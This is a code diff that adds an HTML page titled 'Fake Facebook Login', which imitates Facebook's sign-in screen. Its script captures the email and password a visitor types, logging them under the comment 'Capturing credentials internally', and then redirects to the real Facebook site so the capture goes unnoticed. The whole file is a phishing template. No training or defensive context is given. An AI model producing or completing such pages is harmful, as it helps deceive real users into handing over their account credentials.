@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            width: 350px;
+            padding: 40px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        .login-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #4267B2;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4267B2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-container button:hover {
+            background-color: #365899;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #0078FF;
+            text-decoration: none;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .create-account a {
+            color: #0078FF;
+            text-decoration: none;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Facebook</h2>
+        <input id="email" type="text" placeholder="Email or Phone Number" required>
+        <input id="password" type="password" placeholder="Password" required>
+        <button onclick="login()">Log In</button>
+
+        <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+        </div>
+
+        <div class="create-account">
+            <p>Don't have an account? <a href="#">Create New Account</a></p>
+        </div>
+    </div>
+
+    <script>
+        function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Capturing credentials internally
+            console.log("Email:", email);
+            console.log("Password:", password);
+
+            // Redirecting to a fake success page after login
+            window.location.href = "https://www.facebook.com";  // Fake redirection (you can change this)
+        }
+    </script>
+
+</body>
+</html>
